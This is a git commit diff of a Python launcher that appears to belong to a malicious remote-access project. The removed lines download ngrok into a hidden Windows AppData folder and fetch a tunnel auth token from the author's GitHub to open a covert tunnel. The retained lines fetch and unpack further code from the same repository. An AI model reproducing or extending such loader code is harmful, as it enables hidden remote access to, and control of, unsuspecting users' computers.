7e5f2eb3bfd9369285eaad26adf6a89275188a5e
noel-create <ladi.noel20@gmail.com>
2025-02-09 18:48:38 +0100

    Update launch.py

--- launch.py
+++ launch.py
@@ -43,22 +43,6 @@ user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
-r = requests.get("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip", allow_redirects=True)
-file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok-v3-stable-windows-amd64.zip')
-open(file_path, 'wb').write(r.content)
-with zipfile.ZipFile(file_path, 'r') as zip_ref:
-    zip_ref.extractall(target_path)
-os.remove(file_path)
-
-r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ngrok.txt")
-token195 = r.text
-
-from pyngrok import ngrok, conf
-ngrok_config = conf.PyngrokConfig(ngrok_path=os.path.join(target_path, "ngrok.exe"))
-conf.get_default().ngrok_path = os.path.join(target_path, "ngrok-v3-stable-windows-amd64", "ngrok.exe")
-conf.get_default().install_ngrok = False
-ngrok.set_auth_token(token=str(token195), pyngrok_config=ngrok_config)
-
 r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
 open(file_path, 'wb').write(r.content)
